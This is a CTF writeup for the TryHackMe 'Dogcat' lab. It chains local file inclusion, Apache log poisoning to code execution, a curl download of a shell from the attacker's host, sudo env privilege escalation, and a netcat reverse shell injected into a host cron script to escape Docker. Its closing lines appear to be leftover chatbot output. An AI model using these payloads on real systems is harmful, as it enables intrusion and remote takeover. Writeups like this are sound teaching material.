# 🐶🐱 TryHackMe: Dogcat CTF Writeup

## 📖 Overview

This repository contains a detailed writeup of the **Dogcat** room on TryHackMe.

### 🎯 Objective

* Exploit a vulnerable PHP gallery application
* Abuse **Local File Inclusion (LFI)**
* Achieve **Remote Code Execution (RCE)** via log poisoning
* Gain a reverse shell
* Escalate privileges to root
* Escape a Docker container
* Capture **all 4 flags**

---

## 🔍 1. Initial Reconnaissance

Visiting the target web app shows a simple **dog & cat image gallery**.

### 🔹 Observed Behavior

Clicking buttons changes URL:

```id="url1"
http://<TARGET_IP>/?view=dog
```

📌 This suggests a potential **LFI vulnerability** via the `view` parameter.

---

## 📂 2. Local File Inclusion (LFI)

### 🔹 Attempted Payload

```id="payload1"
?view=../../../../etc/passwd
```

❌ Blocked due to input filtering (must contain `dog` or `cat`)

---

### 🔹 Source Code Disclosure via PHP Filter

```id="payload2"
http://<TARGET_IP>/?view=php://filter/convert.base64-encode/resource=index
```

### 🔹 Decode Base64

```bash id="decode1"
echo "BASE64_STRING" | base64 -d
```

---

### 🔹 Key Findings from Source Code

* Input must contain **"dog" or "cat"**
* `.php` is appended automatically
* Can override using:

```id="ext"
&ext=
```

---

### 🔹 Working LFI Payload

```id="payload3"
http://<TARGET_IP>/?view=dog/../../../../etc/passwd&ext=
```

✅ Successfully reads system files

---

## 💣 3. Remote Code Execution (RCE)

### 🔹 Log Poisoning Attack

Inject PHP into Apache logs:

```bash id="inject"
curl -H 'User-Agent: <?php system($_GET["c"]); ?>' "http://<TARGET_IP>/"
```

---

### 🔹 Execute Commands via LFI

```id="payload4"
http://<TARGET_IP>/?view=dog/../../../../var/log/apache2/access.log&ext=&c=id
```

✅ RCE achieved as `www-data`

---

## 🐚 4. Reverse Shell

### 🔹 Step 1: Host Shell

```bash id="host"
python3 -m http.server 8000
```

---

### 🔹 Step 2: Start Listener

```bash id="listener"
nc -lnvp 9999
```

---

### 🔹 Step 3: Download Shell

```id="payload5"
http://<TARGET_IP>/?view=dog/../../../../var/log/apache2/access.log&ext=&c=curl http://<YOUR_IP>:8000/shell.php -o shell.php
```

---

### 🔹 Step 4: Execute

```id="exec"
http://<TARGET_IP>/shell.php
```

🎉 Reverse shell received!

---

## 🔐 5. Privilege Escalation

### 🔹 Check Permissions

```bash id="sudo"
sudo -l
```

**Output:**

```id="sudo_out"
(root) NOPASSWD: /usr/bin/env
```

---

### 🔹 Exploit via GTFOBins

```bash id="privesc"
sudo env /bin/sh
```

🎉 Root shell obtained

---

## 🧬 6. Docker Escape

### 🔹 Detect Container

```bash id="docker"
ls -la /
```

📌 Found `.dockerenv` → Inside Docker

---

### 🔹 Investigate Backups

```bash id="backup"
cat /opt/backups/backup.sh
```

📌 Script executed by host (cronjob)

---

### 🔹 Inject Reverse Shell

```bash id="inject2"
echo 'nc <YOUR_IP> 8888 -e /bin/bash' >> /opt/backups/backup.sh
```

---

### 🔹 Start Listener

```bash id="listener2"
nc -lnvp 8888
```

⏳ Wait for cron execution...

🎉 Shell received from **host machine**

---

## 🏁 Flags Captured

| Flag      | Location         |
| --------- | ---------------- |
| 🥇 Flag 1 | Web directory    |
| 🥈 Flag 2 | System files     |
| 🥉 Flag 3 | Root (container) |
| 🏆 Flag 4 | Host machine     |

---

## 🧠 Key Takeaways

* LFI can lead to full system compromise
* PHP filters are powerful for source disclosure
* Log poisoning → easy RCE
* Misconfigured sudo = instant root
* Docker ≠ security boundary
* Cronjobs can be abused for container escape

---

## 🛠️ Tools Used

* Nmap
* Curl
* Netcat
* Python HTTP Server
* GTFOBins

---

## 👨‍💻 Author

**Muhammad Taher**
Cybersecurity Enthusiast | CTF Player

---

## ⭐ Final Notes

> This room is a perfect example of chaining vulnerabilities:
> **LFI → RCE → Reverse Shell → PrivEsc → Docker Escape**

---

If you want next level:

* 🔥 Add **badges (TryHackMe, difficulty, OS)**
* 🎨 Add **screenshots section**
* 📁 Make a **full CTF portfolio repo (multi-room)**
* 🧾 Convert all your writeups into a **professional pentest portfolio**

Just tell me 👍
